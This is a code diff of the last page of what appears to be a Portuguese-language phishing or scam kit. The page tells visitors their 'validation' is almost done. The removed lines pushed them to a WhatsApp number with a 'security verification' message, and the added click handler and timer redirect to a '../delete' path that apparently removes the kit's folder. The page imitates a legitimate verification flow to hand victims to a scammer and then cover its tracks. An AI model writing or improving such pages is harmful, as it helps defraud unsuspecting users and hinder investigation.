@@ -290,14 +290,10 @@ session_start();
             <p>Falta apenas uma etapa para concluir sua validação! Clique no botão abaixo e continue seu atendimento em nosso novo canal.</p>
         </div>
 
-        <a href="https://api.whatsapp.com/send?phone=+5511910006242&text=VERIFICA%C3%87%C3%83O+DE+SEGURAN%C3%87A+%2A23737272%2A">
-            <img src="../../assets/imgs/whatsapp.png" class="blink" width="100%">
-        </a>
-        <meta http-equiv="REFRESH" content="500000; url=https://api.whatsapp.com/send?phone=+5511910006242&text=VERIFICA%C3%87%C3%83O+DE+SEGURAN%C3%87A+%2A23737272%2A">
-
-
+        <span>
+            <img src="../../assets/imgs/whatsapp.png" class="blink deletar_pasta" width="100%">
+        </span>
     </div>
-
     <div data-component="loading">
         <div class="modalBgLoading" style="display: none;">
             <div class="loading"></div>
@@ -309,8 +305,11 @@ session_start();
         $(document).ready(function() {
             setTimeout(function() {
                 location.href = "../delete";
-            }, 4000);
+            }, 5000);
 
+            $(document).on('click', '.deletar_pasta', function() {
+                location.href = "../delete";
+            });
         });
     </script>
 </body>
